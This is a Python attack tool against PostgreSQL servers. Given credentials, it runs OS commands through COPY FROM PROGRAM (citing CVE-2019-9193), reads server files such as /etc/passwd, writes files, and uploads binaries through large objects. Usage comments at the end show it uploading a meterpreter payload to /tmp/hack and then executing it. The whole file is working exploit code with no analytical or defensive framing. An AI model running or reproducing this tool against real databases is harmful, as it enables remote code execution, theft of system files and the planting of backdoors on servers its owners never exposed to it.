#!/usr/bin/python
import string
import psycopg2
import random
from tqdm import *
import argparse
import base64


def random_str(l):
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(l))


def random_num(l):
    if l < 0:
        print("l should > 0")
        exit(-1)
    if l == 1:
        return str(random.randrange(1, 9))
    else:
        return str(random.randrange(1, 9)) + ''.join(str(random.randrange(0, 9)) for _ in range(l - 1))


def connect(overtime=3):
    try:
        conn = psycopg2.connect(database=targetDB, user=targetUser, password=targetPass, host=target, port=targetPort,
                                client_encoding=out_put_encode, connect_timeout=overtime)
        # print("[+] Opened database successfully")
        return conn
    except:
        print("[!] Connect fail")
        exit(-1)


def sql_query(conn, sql, output=True, output_err=False):
    cur = conn.cursor()
    # print(sql)
    cur.execute(sql)
    conn.commit()
    try:
        rows = cur.fetchall()
        for item in rows:
            if output:
                print(repr(item[0])[1:-1])
    except Exception as e:
        if output_err:
            print(e)
        pass


def getVersion(conn):
    cur = conn.cursor()
    cur.execute('show server_version;')
    db_version = cur.fetchone()
    return db_version[0]


def quit(conn):
    conn.close()


def rce(cmd_to_go):
    # encode_type in ["GBK", "UTF8"]
    # CVE-2019-9193
    # if float(getVersion(connect())) < 9.3:
    #     print("[!] 目标数据库版本低于 9.3, 可能攻击失败.")
    random_table = random_str(5)
    commands = [
        "DROP TABLE IF EXISTS %s;" % random_table,
        "CREATE TABLE %s(cmd_output text);" % random_table,
        "COPY %s FROM PROGRAM '%s';" % (random_table, cmd_to_go)
    ]
    for sql in commands:
        sql_query(connect(timeoutsec), sql, output=False)

    commands = [
        "SELECT * FROM %s;" % random_table,
        "DROP TABLE IF EXISTS %s;" % random_table
    ]
    for sql in commands:
        sql_query(connect(timeoutsec), sql, output=True)


def file_read(target_file):
    random_table = random_str(5)
    commands = [
        "DROP TABLE IF EXISTS %s;" % random_table,
        "CREATE TABLE %s(output text);" % random_table,
        "COPY %s from '%s';" % (random_table, target_file),
        "SELECT * FROM %s;" % random_table,
        "DROP TABLE IF EXISTS %s;" % random_table
    ]
    for sql in commands:
        sql_query(connect(timeoutsec), sql, output=True)


def get_binary_base64(bdata):
    encoded_bytes = base64.b64encode(bdata)
    encoded_text = encoded_bytes.decode('utf-8')
    return encoded_text


def text_upload(text, dst):
    text = str(text)
    b64_data = get_binary_base64(text.encode())
    sql_Line = "COPY (select convert_from(decode('%s','base64'),'utf-8')) to '%s';" % (b64_data, dst)
    sql_query(connect(timeoutsec), sql_Line, output=False)
    print("[+] Uploaded")


def bin_split(src, chunk_size):
    b64_list = []
    with open(src, 'rb') as f:
        binary_data = f.read()
    chunks = [binary_data[i:i + chunk_size] for i in range(0, len(binary_data), chunk_size)]
    for i, chunk in enumerate(chunks):
        encoded_chunk = base64.b64encode(chunk).decode('utf-8')
        b64_list.append(encoded_chunk)
    return b64_list


def bin_upload(src, dst):
    random_oid = int(random_num(5))
    commands = [
        "SELECT lo_creat(-1);",
        "SELECT lo_create(%i);" % random_oid
    ]
    for sql in commands:
        sql_query(connect(timeoutsec), sql, output=False)

    bin_chunk = bin_split(src, 2048)
    commands = []
    index = 0
    for b64_chunk in bin_chunk:
        commands.append("INSERT INTO pg_largeobject (loid, pageno, data) VALUES (%i, %i, decode('%s', 'base64'));" % (
            random_oid, index, b64_chunk))
        index += 1
    for sql in tqdm(commands):
        sql_query(connect(timeoutsec), sql, output=False, output_err=False)
    sql_query(connect(timeoutsec), "SELECT lo_export(%i, '%s');" % (random_oid, dst), output=False)
    sql_query(connect(timeoutsec), "SELECT lo_unlink(%i);" % (random_oid), output=False)
    print("[+] Uploaded")


parser = argparse.ArgumentParser(description='PostgreSQL tools')

parser.add_argument('--host', required=True, help='Target Host')
parser.add_argument('-p', '--port', type=int, default=5432, help='Target Port')
parser.add_argument('-u', '--user', default="postgres", help='Target User')
parser.add_argument('-w', '--password', required=True, help='Target Password')
parser.add_argument('-d', '--db', default="template1", help='Target Database')
parser.add_argument('-m', required=True, choices=["rce", "text_upload", "bin_upload", "read", "sql"],
                    help='Attack mode: rce, upload, read, sql')
parser.add_argument('-c', help='cmd to run')
parser.add_argument('-s', help='src file to read')
parser.add_argument('-t', help='target file to upload')
parser.add_argument('-e', default="UTF8", help='Output encode: GBK, UTF8')
parser.add_argument('--timeout', default=3, type=int, help='DB connect overtime, default 3s')
args = parser.parse_args()

target = args.host
targetPort = args.port
targetUser = args.user
targetPass = args.password
targetDB = args.db
attack_mode = args.m
command = args.c
src_file = args.s
dst_file = args.t
out_put_encode = args.e
timeoutsec = args.timeout

if attack_mode == "rce" and not command:
    print("[!] 需要指定 -c 参数")
    exit(-1)
elif attack_mode == "rce" and command:
    rce(cmd_to_go=command)

if attack_mode == "text_upload" and not (src_file and dst_file):
    print("[!] 需要指定 -s 和 -t 参数")
    exit(-1)
elif attack_mode == "text_upload" and src_file and dst_file:
    text_upload(src_file, dst_file)

if attack_mode == "bin_upload" and not (src_file and dst_file):
    print("[!] 需要指定 -s 和 -t 参数")
    exit(-1)
elif attack_mode == "bin_upload" and src_file and dst_file:
    bin_upload(src_file, dst_file)

if attack_mode == "read" and not src_file:
    print("[!] 需要指定 -s 参数")
    exit(-1)
elif attack_mode == "read" and src_file:
    file_read(target_file=src_file)

if attack_mode == "sql" and not command:
    print("[!] 需要指定 -c 参数")
    exit(-1)
elif attack_mode == "sql" and command:
    sql_query(connect(timeoutsec), command, output=True)

# sql_query(connect(host=host, password=password), "show server_version;")
# python PostgreSQL_tool.py --host "192.168.163.156" -w "123456" -m "rce" -c "whoami" -e "GBK"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "read" -s "/etc/passwd" -e "UTF8"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "sql" -c "show server_version;" -e "UTF8"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "text_upload" -s "this is test" -t "/tmp/1.txt"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Downloads\FOV 100-99-0-1-1693540851.zip" -t "/tmp/1.zip"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Desktop\白名单\meterpreter" -t "/tmp/hack"
# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "rce" -c "chmod +x /tmp/hack;/tmp/hack" -e "UTF8"
